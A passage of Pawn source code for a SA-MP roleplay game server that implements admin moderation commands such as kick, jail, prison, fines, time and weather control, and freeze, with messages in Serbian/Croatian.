        WriteLog("log-punishment", "Admin %s je fineova%s igraca %s | -$%d", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ), novac);
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:kick( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1)
	{
  	    new id, reason[32];
		if( sscanf( params, "rs[32]", id, reason ) ) return SendUsageMessage( playerid, "/kick [id] [razlog] ");
		if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe kickovat!");
		if( strlen( reason ) < 1 || strlen( reason ) > 31 ) return SendErrorMessage( playerid, "Razlog ne moze biti duzi od 31 simbola!");
	    if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozes kickati direktore i vlasnike!");
	    if(IsSpecialUser(id)) return SendErrorMessage(playerid, "Glavne ne mores kick.");
	    if( PlayerInfo[playerid][xAdmin] < PlayerInfo[id][xAdmin] ) return SendErrorMessage( playerid, "Ne mozes to jacima od sebe");
	    if(PlayerInfo[id][xSpecAdmin]) return SendErrorMessage( playerid, "Ne mozes to svom kolegi.");

	    PlayerInfo[ playerid ][ xAGMStats ]++;
		sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );
		ServerInfo[ KikovanihKorisnika ]++;

		SCMF( id, 0xFF0000FF, "#KICK: {FFFFFF}Kickovani ste! {FF0000}| Admin: {FFFFFF}%s {FF0000}| Razlog: {FF0000}%s", ImeIgraca( playerid ), reason );
		SetPlayerTimerEx(id, "KickIgraca", 50, false, "i", id);

		SCMF( playerid, CRVENA, "#KICK: {FFFFFF}Kickovali ste igraca {FF0000}%s, {FFFFFF}razlog: {FF0000}%s", ImeIgraca( id ), reason);
		SendClientMessageToAllEx( 0xFF4500FF, "#KICK: {FFFFFF}Admin je kickovao igraca: {FF4500}%s {FFFFFF}| Razlog: {FF4500}%s", ImeIgraca( id ), reason );

		AdminMsg( ADM_WARN, "[ADMIN] %s je kickova%s %s, razlog: %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ), reason );
		WriteLog("log-kick", "%s %s je kikova%s igraca %s | Razlog: %s", (PlayerInfo[playerid][xSpecAdmin] == 1) ? ("Spec Admin") : ("Admin"), ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ), reason);
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unjail( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new id;
		if( sscanf( params, "r", id ) ) return SendUsageMessage( playerid, "/unjail [id]");
		if( id == IPI ) return SendUsageMessage( playerid, "Pogresan ID igraca." );
		if( PlayerInfo[ id ][ xZatvor ] != JAIL ) return SendErrorMessage( playerid, "Da bi oslobodili igraca on prvo mora biti u zatvoru." );

		SMG_SetPlayerPos( id, 1536.2214,-1663.0848,13.5469 );
		UcitajObjekte( id );
		SetCameraBehindPlayer( id );
		SetPlayerInterior( id, 0 );
		SetPlayerVirtualWorld( id, 0 );

		PlayerInfo[ id ][ xZatvor ] = 0;
		PlayerInfo[ id ][ xZatvorVreme ] = 0;
		GameTextForPlayer( id, "~g~Sloboda~n~~w~Pokusajte biti bolji gradjanin", 5000, 1);

        new q[ 100 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '0', `jail_time` = '0' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ id ][ xID ] );
		mysql_tquery( mSQL, q );

		SCMF( id, 0xFF6347FF, "#UNJAIL: {FFFFFF}Admin {FF6347}%s {FFFFFF}vas je oslobodi%s iz jaila.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		SCMF( playerid, 0xFF6347FF, "#UNJAIL: {FFFFFF}Oslobodili ste igraca {FF6347}%s {FFFFFF}iz jaila.", ImeIgraca( id ) );
 
	   	AdminMsg( ADM_WARN, "[ADMIN] %s je oslobodi%s iz jaila igraca %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );

	    WriteLog("log-unjail", "Admin %s je unjailova%s igraca %s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ));
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unprison( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/unprison [id]");
		if( id == INVALID_PLAYER_ID ) return SendErrorMessage(playerid, "Taj igrac nije online.");
		if( PlayerInfo[ id ][ xZatvor ] != PRISON ) return SendErrorMessage( playerid, "Da bi oslobodili igraca on prvo mora biti u prisonu." );

		SetPlayerInterior( id, 0 );
		SMG_SetPlayerPos( id, 1536.2214,-1663.0848,13.5469 );
		SetPlayerWorldBounds( id, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
		SetPlayerVirtualWorld( id, 0 );
		PlayerInfo[ id ][ xZatvor ] = 0;
		PlayerInfo[ id ][ xZatvorVreme ] = 0;
		GameTextForPlayer( id, "~g~Sloboda!~n~~w~Pokusajte biti bolji gradjanin!", 5000, 3);

        new q[ 100 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '0', `jail_time` = '0' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ id ][ xID ] );
		mysql_tquery( mSQL, q );

		SCMF( id, 0xFF6347FF, "#UNPRISON: {FFFFFF}Admin {FF6347}%s {FFFFFF}vas je oslobodi%s iz prisona.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		SCMF( playerid, 0xFF6347FF, "#UNPRISON: {FFFFFF}Oslobodili ste igraca {FF6347}%s {FFFFFF}iz prisona.", ImeIgraca( id ) );
 
	   	AdminMsg( ADM_WARN, "[ADMIN] %s je oslobodi%s iz prisona igraca %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );

  		WriteLog("log-unjail", "Admin %s je unprisonova%s igraca %s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ));
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:jail( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		new id, time, razlog[40];
		if( sscanf(params, "uis[40]", id, time, razlog ) ) return SendUsageMessage( playerid, "/jail [id] [minute] [razlog]");
		SendClientMessage(playerid, -1, "Napomena: {CCCCCC}Imate i komandu {FFFFFF}/(pp)punishplayer {CCCCCC}za razne IC kazne.");

		if( IsPlayerConnected( id ) )
		{
			if( id != IPI )
			{
			    if( PlayerInfo[ playerid ][ xAdmin ] < 5 && PlayerInfo[ id ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes zatvoriti clana Admin tima!");
			    if( PlayerInfo[ id ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes zatvoriti igraca koji je vec u zatvoru!");
				if( time < 1 || time > 1440 ) return SendErrorMessage( playerid, "Minute pritvora ne mogu biti manje od 1 i vece od 1440.");
				if( PlayerInfo[playerid][xAdmin] < PlayerInfo[id][xAdmin] ) return SendErrorMessage( playerid, "Ne mozes to jacima od sebe");

				ResetPlayerWeapons( id );
	    		PlayerInfo[ id ][ xZatvor ] = JAIL;
	   			PlayerInfo[ id ][ xZatvorVreme ] = time;
				ClearAnimations( id );
				PlayerCP[ id ] = 0;

				if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_MAIN ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_MAIN );
				SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
				PlayerCuffed[ id ] = 0;

				WriteLog("log-punishment", "Admin %s je jailovao igraca %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), razlog);

				new rand = random( sizeof( RandomZatvor ) );
				SMG_SetPlayerPos( id, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
				PlayerInfo[ id ][ xWanted ] = 0;
				SMG_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
				strmid( ZlocinInfo[ id ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
	            UcitajObjekte( id );
			    SetCameraBehindPlayer( id ); SetPlayerInterior( id, 0 );
			    SetPlayerVirtualWorld( id, 0 );

                new q[ 150 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '%d', `jail_time` = '%d', `wanted_level` = '%d' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ id ][ xZatvor ], PlayerInfo[ id ][ xZatvorVreme ], PlayerInfo[ id ][ xWanted ], PlayerInfo[ id ][ xID ] );
				mysql_tquery( mSQL, q );

				PlayerInfo[ playerid ][ xAGMStats ]++;
	    		sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

				SCMF( id, 0xFF6347FF, "#JAIL: {FFFFFF}Admin {FF6347}%s {FFFFFF}vas je stavi%s u zatvor na {FF6347}(%d) {FFFFFF}min, razlog: {FF6347}%s", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), time, razlog );
				SendClientMessage(id, 0xFF6347FF, "#JAIL: {FFFFFF}Iz zatvora se mozete vaditi putem kaucije - {FF6347}[ /bail ].");
				SCMF( playerid, 0xFF6347FF, "#JAIL: {FFFFFF}Postavili ste igraca {FF6347}%s {FFFFFF}u zatvor na {FF6347}(%d) {FFFFFF}min, razlog: {FF6347}%s", ImeIgraca( id ), time, razlog );

			   	SendClientMessageToAllEx( 0xFF4500FF, "#JAIL: {FFFFFF}Admin je postavio {FF6347}%s {FFFFFF}u zatvor, vreme: {FF6347}%d {FFFFFF}| Razlog: {FF6347}%s.", ImeIgraca( id ), time, razlog );
 
			   	AdminMsg( ADM_WARN, "[ADMIN] Admin %s je postavi%s igraca %s u zatvor na %d min, razlog: %s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ), time, razlog );
				return 1;
			}
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:prison( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 2 )
	{
		new id, vreme, razlog[40];
		if( sscanf( params, "uis[40]", id, vreme, razlog ) )
		{
			SendUsageMessage( playerid, "/prison [id] [sati] [razlog]");
			SendClientMessage(playerid, -1, "Sati u danima: 72h - 3 dana / 96h - 4 dana / 120h - 5 dana / 144h - 6 dana / 168h - 7 dana");
			return 1;
	    }
	    if( id != IPI )
		{
			if( IsPlayerConnected( id ) )
			{
			    if( PlayerInfo[ playerid ][ xAdmin ] < 5 && PlayerInfo[ id ][ xAdmin ] >= 5 ) return SendErrorMessage( playerid, "Ne mozes zatvoriti clana Admin tima!");
				if( vreme < 1 ) return SendErrorMessage( playerid, "Vreme u prisonu ne moze biti manje od 1 sata. Stavite ga u /jail onda!");
                if( vreme > 168 ) return SendErrorMessage( playerid, "Vreme u prisonu ne moze biti vece od 168 sati!");

                if( PlayerInfo[ playerid ][ xGamemaster ] >= 3 )
				{
		            if( PlayerInfo[ id ][ xGamemaster ] == 0 ) return SendErrorMessage( playerid, "Kao vodja Gamemastera mozes prisonovati samo Gamemastere." );
		        }

		        if( PlayerInfo[playerid][xAdmin] < PlayerInfo[id][xAdmin] ) return SendErrorMessage( playerid, "Ne mozes to jacima od sebe");

				ResetPlayerWeapons( id );
	    		PlayerInfo[ id ][ xZatvor ] = PRISON;
	   			PlayerInfo[ id ][ xZatvorVreme ] = vreme*60;
				ClearAnimations( id );
				if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_MAIN ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_MAIN );
				SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
				PlayerCuffed[ id ] = 0;

				GameTextForPlayer( id, "~w~dobrodosao/la u~n~~r~prison!", 5000, 3 );

				WriteLog("log-punishment", "Admin %s je prisonovao igraca %s | Vreme: %dh | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), vreme, razlog);

				PlayerInfo[ playerid ][ xAGMStats ]++;
	    		sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

                PlayerCP[ id ] = 0;

				SMG_SetPlayerPos( id, 107.2300, 1920.6311, 18.5208 );
				SetPlayerWorldBounds( id, 337.5694, 101.5826, 1940.9759, 1798.7453 );
				PlayerInfo[ id ][ xWanted ] = 0;
				SMG_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
				strmid( ZlocinInfo[ id ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
	            UcitajObjekte( id );
			    SetCameraBehindPlayer( id );
				SetPlayerInterior( id, 0);
			    SetPlayerVirtualWorld( id, 1);

                new q[ 150 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '%d', `jail_time` = '%d', `wanted_level` = '%d' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ id ][ xZatvor ], PlayerInfo[ id ][ xZatvorVreme ], PlayerInfo[ id ][ xWanted ], PlayerInfo[ id ][ xID ] );
				mysql_tquery( mSQL, q );

				SCMF( id, 0xFF6347FF, "#PRISON: {FFFFFF}Admin {FF6347}%s {FFFFFF}vas je stavi%s u prison na {FF6347}(%dh), {FFFFFF}razlog: {FF6347}%s", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), vreme, razlog );
				SCMF( playerid, 0xFF6347FF, "#PRISON: {FFFFFF}Postavili ste igraca {FF6347}%s {FFFFFF}u prison na {FF6347}(%dh), {FFFFFF}razlog: {FF6347}%s", ImeIgraca( id ), vreme, razlog );

			   	SendClientMessageToAllEx( 0xFF4500FF, "#PRISON: {FFFFFF}Admin je postavio {FF6347}%s {FFFFFF}u prison, vreme: {FF6347}%dh {FFFFFF}| Razlog: {FF6347}%s", ImeIgraca( id ), vreme, razlog );
 
			   	AdminMsg( ADM_WARN, "[ADMIN] Admin %s je postavi%s igraca %s u prison na %dh | Razlog: %s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ), vreme, razlog );
			}
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:maknisastatsa( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 6 )
	{
		new vrsta, imeigraca[ 24 ];
		if( sscanf( params, "s[24]i", imeigraca, vrsta ) )
		{
			SendUsageMessage( playerid, "/maknisastatsa [ Ime_Prezime ] [ Vrsta ]");
			SendClientMessage( playerid, -1, "[Vrste]: 1. Imovina 1 | 2. Imovina 2 | 3. Imovina 3 | 4. Firma");
			return 1;
	    }
	    if( vrsta < 1 || vrsta > 4 ) return SendErrorMessage( playerid, "Vrsta moze od 1 do 4." );

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da mu mozes maknuti online.");
			return 1;
		}

		new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerRemoveStats", "iis", playerid, vrsta, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offprison( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 2  )
	{
		new vreme, razlog[40], imeigraca[ 24 ];
		if( sscanf( params, "s[24]is[40]", imeigraca, vreme, razlog ) )
		{
			SendUsageMessage( playerid, "/offprison [Ime_Prezime] [sati] [razlog]");
			SendClientMessage(playerid, -1, "Sati u danima: 72h - 3 dana / 96h - 4 dana / 120h - 5 dana / 144h - 6 dana / 168h - 7 dana");
			return 1;
	    }

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da izbaci ga online.");
			return 1;
		}
		if( vreme < 1 ) return SendErrorMessage( playerid, "Vreme u arei ne moze biti manje od 1 sat. Stavite ga u jail onda!");
  		if( vreme > 168 ) return SendErrorMessage( playerid, "Vreme u prisonu ne moze biti vece od 168 sati!");

        new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffJandP", "iisis", playerid, PRISON, imeigraca, (vreme*60), razlog );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offjail( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 2  )
	{
		new vreme, razlog[40], imeigraca[ 24 ];
		if( sscanf( params, "s[24]is[40]", imeigraca, vreme, razlog ) )
		{
			SendUsageMessage( playerid, "/offjail [Ime_Prezime] [minuti] [razlog]");
			return 1;
	    }

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da izbaci ga online.");
			return 1;
		}
		if( vreme < 1 || vreme > 1440 ) return SendErrorMessage( playerid, "Minute pritvora ne mogu biti manje od 1 i vece od 1440.");

		new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffJandP", "iisis", playerid, JAIL, imeigraca, vreme, razlog );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:checkpp( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
        if( PlayerInfo[ playerid ][ xAdmin ] <= 4 && !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new player_name[ MAX_PLAYER_NAME ];
	    if( sscanf( params, "s[24]", player_name ) )
		{
			SendUsageMessage( playerid, "/checkpp [Ime_Prezime]");
			return 1;
		}

		new query[ 128 ];
		mysql_format( mSQL, query, sizeof( query ), "SELECT p_id FROM punishments WHERE p_user_id = (SELECT user_id FROM users WHERE p_name = '%e')", player_name );
		mysql_tquery( mSQL, query, "selectPunishmentsbyName", "is", playerid, player_name );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:proverikaznu( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new pun_id;
	    if( sscanf( params, "i", pun_id ) )
		{
			SendUsageMessage( playerid, "/proverikaznu [id kazne]");
			return 1;
		}
		if( pun_id < 1 ) return SendErrorMessage( playerid, "ID kazne ne moze ici ispod 1." );

		new query[ 344 ];
		mysql_format( mSQL, query, sizeof( query ),
			"SELECT punishments.p_reason, punishments.p_jail_min, punishments.p_money_fine, admin.p_name AS admin_name, kaznjen.p_name AS kaznjen \
			FROM punishments \
	    	LEFT JOIN users AS admin ON punishments.p_admin = admin.user_id \
	    	LEFT JOIN users AS kaznjen ON punishments.p_user_id = kaznjen.user_id \
	    	WHERE p_id = '%d' LIMIT 1", pun_id );
		mysql_tquery( mSQL, query, "selectPunishmentbyID", "ii", playerid, pun_id );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	return 1;
}

CMD:apravila( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
	    ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																		    	"{FFFFFF}Prestup\t{FFFFFF}Kazna\n\
																				{4282C0}(1). {FFFFFF}DM\t25Min zatvora i 25.000$\n\
																				{4282C0}(2). {FFFFFF}SK\t20Min zatvora i 20.000$\n\
																				{4282C0}(3). {FFFFFF}RK\t15Min zatvora i 15.000$\n\
																				{4282C0}(4). {FFFFFF}PG\t5Min zatvora i 5.000$\n\
																				{4282C0}(5). {FFFFFF}MG\t5Min zatvora i 5.000$\n\
																				{4282C0}(6). {FFFFFF}DB\t10Min zatvora i 10.000$\n\
																				{4282C0}(7). {FFFFFF}NJ\t15Min zatvora i 15.000$\n\
																				{4282C0}(8). {FFFFFF}PvP\t5Min zatvora i 5.000$\n\
																				{4282C0}(9). {FFFFFF}KOS\t15Min zatvora i 15.000$\n\
																				{4282C0}(10). {FFFFFF}TK\t30Min zatvora i 30.000$\n\
																				{4282C0}(11). {FFFFFF}Vredjanje\t90Min zatvora i 90.000$\n\
																				{4282C0}(12). {FFFFFF}Ometanje Radnika\t30Min zatvora i 30.000$\n\
																				{4282C0}(13). {FFFFFF}Prevara\t600Min zatvora\n\
																				{4282C0}(14). {FFFFFF}Inv/ad\t5Min zatvora i 5.000$\n\
																				{4282C0}(15). {FFFFFF}CR\t5Min zatvora i 5.000$\n\
																				{4282C0}(16). {FFFFFF}PvE\t5Min zatvora i 5.000$\n\
																				{4282C0}(17). {FFFFFF}RPS\t25Min zatvora i 25.000$\n\
																				{4282C0}(18). {FFFFFF}NonRP\t20Min zatvora i 20.000$\n\
																				{4282C0}(19). {FFFFFF}GM Ugovor\t180Min zatvora, 500.000$ i 2x Warna\n\
																				{4282C0}(20). {FFFFFF}Promoter Ugovor\t120Min zatvora, 350.000$ i 1x Warn", "OK", "" );
	}
	return 1;
}

CMD:punishplayer( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		new id, reason;

		if( sscanf(params, "ri", id, reason ) )
		{
			SendUsageMessage(playerid, "/(pp)punishplayer [id/name] [razlog id]");
			SendUsageMessage(playerid, "1. DM | 2. SK | 3. RK | 4. PG | 5. MG | 6. DB | 7. NJ | 8. PvP | 9. KOS | 10. TK");
			SendUsageMessage(playerid, "11. Vredjanje | 12. Ometanje Radnika | 13. Prevara | 14. inv/ad | 15. CR | 16. PvE | 17. RPS" );
			SendUsageMessage(playerid, "18. NonRP | 19. GM Ugovor | 20. Promoter Ugovor" );
			return 1;
		}
		if( id == IPI ) return SendErrorMessage( playerid, "Uneli ste pogresan ID igraca." );
		if( playerid == id ) return SendErrorMessage( playerid, "Ne mozes sam dati kaznu." );
        if( reason < 1 || reason > 20 ) return SendErrorMessage( playerid, "ID razloga ne moze ici ispod 1 ili iznad 20." );
        if( PlayerInfo[id][xAdmin] != 0 || PlayerInfo[id][xGamemaster] != 0 || PlayerInfo[id][xSpecAdmin] != 0 ) return SendErrorMessage(playerid, "Ne mozes admina, gma....");

        new 
        	jail_time = 10,
        	money_fine = 500, 
        	reason_s[ 32 ],
        	warns = 0;

        switch( reason )
		{
            case 1:
			{
                reason_s = "DM";
                jail_time = 25;
                money_fine = jail_time*1000;
            }
            case 2:
			{
                reason_s = "SK";
                jail_time = 20;
                money_fine = jail_time*1000;
            }
			case 3:
			{
                reason_s = "RK";
                jail_time = 15;
                money_fine = jail_time*1000;
            }
			case 4:
			{
                reason_s = "PG";
                jail_time = 5;
                money_fine = jail_time*1000;
            }
			case 5:
			{
                reason_s = "MG";
                jail_time = 5;
                money_fine = jail_time*1000;
            }
			case 6:
			{
                reason_s = "DB";
                jail_time = 10;
                money_fine = jail_time*1000;
            }
			case 7:
			{
                reason_s = "NJ";
                jail_time = 15;
                money_fine = jail_time*1000;
            }
			case 8:
			{
                reason_s = "PvP";
                jail_time = 5;
                money_fine = jail_time*1000;
            }
			case 9:
			{
                reason_s = "KOS";
                jail_time = 15;
                money_fine = jail_time*1000;
            }
			case 10:
			{
                reason_s = "TK";
                jail_time = 30;
                money_fine = jail_time*1000;
            }
			case 11:
			{
                reason_s = "Vredjanje";
                jail_time = 90;
                money_fine = jail_time*1000;
            }
			case 12:
			{
                reason_s = "Ometanje radnika";
                jail_time = 30;
                money_fine = jail_time*1000;
            }
			case 13:
			{
                reason_s = "Prevara";
                jail_time = 600;
                money_fine = 0;
            }
			case 14:
			{
                reason_s = "Invalid /ad";
                jail_time = 5;
                money_fine = jail_time*1000;
            }
			case 15:
			{
                reason_s = "CR";
                jail_time = 5;
                money_fine = jail_time*1000;
            }
			case 16:
			{
                reason_s = "PvE";
                jail_time = 5;
                money_fine = jail_time*1000;
            }
			case 17:
			{
                reason_s = "RPS";
                jail_time = 25;
                money_fine = jail_time*1000;
            }
			case 18:
			{
                reason_s = "NonRP";
                jail_time = 20;
                money_fine = jail_time*1000;
            }
			case 19:
			{
                reason_s = "Ugovor - GM";
                jail_time = 180;
                money_fine = 500000;
                warns = 2;
            }
			case 20:
			{
                reason_s = "Ugovor - Promoter";
                jail_time = 120;
                money_fine = 350000;
                warns = 1;
            }
        }
        sql_create_punishment( id, playerid, reason_s, jail_time, money_fine, warns );

        PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}
alias:punishplayer( "pp" );

CMD:tod( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 || PlayerInfo[ playerid ][ xAdmin ] >= 4 )
	{
		new vreme;
		if( sscanf( params, "i", vreme ) ) return SendUsageMessage( playerid, "/tod [vreme(0-23)]");
		if( vreme < 0 || vreme > 23 ) return SendErrorMessage( playerid, "Odabir mora biti 0 ili veci i manji od 24.");

	    SetWorldTime( vreme );
	    ServerInfo[ VremeInGame ] = vreme;
		SendClientMessageToAllEx( ZELENA, "#TOD: {FFFFFF}Sati postavljeni na {33AA33}%d' {FFFFFF}sati.", vreme );
 
	    DodajWarnRed("~y~(TOD) %s ~w~je promjeni%s sat na: ~y~%d", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), vreme);
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:vreme( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 3 || PlayerInfo[ playerid ][ xAdmin ] < 4 )  return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new vreme;
	if( sscanf( params, "i", vreme ) ) return SendUsageMessage( playerid, "/vreme [broj(0-45)]");
	if( vreme < 0 || vreme > 45 ) return SendErrorMessage( playerid, "Odabir mora biti veci od 0 i manji od 45.");

	SendClientMessageToAllEx( ZELENA, "#VREME: {FFFFFF}Vreme stavljeno na {33AA33}%d.", vreme );

  	SetWeather( vreme );
  	ServerInfo[ Prognozasys ] = vreme;
 
    DodajWarnRed("~y~(VREME) %s ~w~je promjeni%s vrijeme na: ~y~%d", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), vreme);
	return 1;
}

CMD:vtod( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xVIPLevel ] >= 6 || PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new vreme;
		if( sscanf( params, "i", vreme ) ) return SendUsageMessage( playerid, "/vtod [vreme(0-23)]");
		if( vreme < 0 || vreme > 23 ) return SendErrorMessage( playerid, "Odabir mora biti 0 ili veci i manji od 24.");

	    SetPlayerTime(playerid, vreme, 0);
		SCMF(playerid, ZELENA, "#VIPTOD: {FFFFFF}Sati postavljeni na {33AA33}'%d' {FFFFFF}sati.", vreme );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:vvreme( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xVIPLevel ] >= 6 || PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new vreme;
		if( sscanf( params, "i", vreme ) ) return SendUsageMessage( playerid, "/vvreme [broj(0-45)]");
		if( vreme < 0 || vreme > 45 ) return SendErrorMessage( playerid, "Odabir mora biti veci od 0 i manji od 45.");

		SCMF(playerid, ZELENA, "#VIPVREME: {FFFFFF}Vreme stavljeno na {33AA33}'%d'.", vreme );

	  	SetPlayerWeather(playerid, vreme);
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:freeze( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/freeze [id]");
		if( IsPlayerConnected( id ) )
		{
			if( id != IPI )
			{
				SMG_TogglePlayerControllable( id, false );

				SendInfoMessage( id, "Admin {FFFFFF}%s {4282C0}vas je zaledi%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
				SendInfoMessage( playerid, "Zaledili ste igraca {FFFFFF}%s.", ImeIgraca( id ) );
 
